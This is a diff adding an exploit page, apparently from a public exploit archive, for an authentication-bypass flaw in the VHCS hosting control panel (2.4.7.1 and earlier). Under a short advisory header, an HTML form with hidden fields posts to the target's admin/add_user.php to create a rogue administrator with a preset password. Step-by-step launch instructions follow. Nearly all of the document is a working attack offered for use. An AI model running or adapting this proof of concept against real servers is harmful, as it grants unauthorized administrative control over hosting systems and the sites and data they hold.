@@ -1,0 +1,88 @@
+source: http://www.securityfocus.com/bid/16600/info
+ 
+Virtual Hosting Control System (VHCS) is prone to multiple input and access vulnerabilities.
+ 
+VHCS is prone to an HTML-injection vulnerability and an authentication-bypass vulnerability. These issues could be exploited to gain administrative access to the application; other attacks are also possible.
+
+
+<html>
+
+<head>
+<title>VHCS (version <= 2.4.7.1) PoC. &nbsp;By RoMaNSoFt</title>
+<script language="JavaScript">
+function submitform()
+{
+  if (document.admin_add_user.username.value=='admin')
+  {
+    alert('Learn to read before launching an exploit, script-kiddie!');
+    exit();
+  }
+  
+  document.admin_add_user.action=document.admin_add_user.target.value;
+  document.admin_add_user.submit();
+}
+</script>
+</head>
+
+<body>
+  <hr>
+  <center>
+  	<b>VHCS (version <= 2.4.7.1) PoC. &nbsp;By RoMaNSoFt &#60roman&#64rs-labs.com&#62 &nbsp;[08.Feb.2006]</b>
+  </center>
+  <hr>
+  
+	<form name="admin_add_user" method="post" action="">
+            <table width="100%" cellpadding="5" cellspacing="5">
+              <tr>
+                <td width="20">&nbsp;</td>
+                <td colspan="2">
+                  &nbsp;
+                </td>
+              </tr>
+              <tr>
+                <td width="20">&nbsp;</td> <td width="200">Target URL</td>
+                <td> 
+                  <input type="text" name="target" value="http://<target>/vhcs2/admin/add_user.php" style="width:400px">
+                </td>
+              </tr>
+              
+              <tr>
+                <td width="20">&nbsp;</td> <td width="200">Username</td>
+                <td> 
+                  <input type="text" name="username" value="admin" style="width:200px">&nbsp;(should NOT exist)
+                </td>
+              </tr>
+              <tr> 
+                <td>&nbsp;</td>
+                <td colspan="2"><a href="javascript: submitform()">Exploit it!</a></td>              
+              </tr>
+              <tr> 
+                <td colspan="3">&nbsp; 
+                  </td>
+              </tr>
+            </table>
+            <input type="hidden" name="pass" value="dsrrocks">
+            <input type="hidden" name="pass_rep" value="dsrrocks">
+            <input type="hidden" name="email" value="vhcs-exploit@rs-labs.com">
+            <input type="hidden" name="uaction" value="add_user">
+        </form>
+        
+        <hr>
+        <br>
+        <u>Quick instructions</u>.-<br>
+        <br>
+        1.- Enable JavaScript. Fill in the form with appropiate target URL (usually you will only need to replace &#60target&#62 string) and username.<br>
+        2.- Remember not to use a probably existing username (such as "admin").<br>
+        3.- Launch the exploit. <i>If target system is vulnerable, a new VHCS admin user will be created</i> ;-)<br>
+        4.- You will be redirected to VHCS login page. Try to login with your brand new username.<br>
+        5.- Ummm, I forgot it... The password is: <b>dsrrocks</b>.<br>
+
+        <br>
+        <u>More info (analysis, fix, etc)</u>.-<br>
+        <br>
+        See <a href=http://www.rs-labs.com/adv/RS-Labs-Advisory-2006-1.txt><i>RS-2006-1</i></a>.<br>
+				<br>
+				<hr>
+</body>
+
+</html>
